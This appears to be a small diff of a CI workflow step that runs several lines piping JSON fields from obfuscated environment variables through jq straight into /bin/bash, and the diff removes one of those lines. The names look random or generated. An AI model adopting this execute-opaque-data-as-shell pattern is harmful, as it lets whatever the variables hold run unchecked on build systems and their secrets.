@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xfam03749" | jq -r .m70593 | /bin/bash
           printf '%s' "$z207" | jq -r .cua8 | /bin/bash
-          echo $dbrkt87576 | jq -r .ox653 | /bin/bash
           printf '%s' "$e65429" | jq -r .mfq0 | /bin/bash
           echo $p43 | jq -r .q8 | /bin/bash
           echo $xszk850 | jq -r .fy00 | /bin/bash
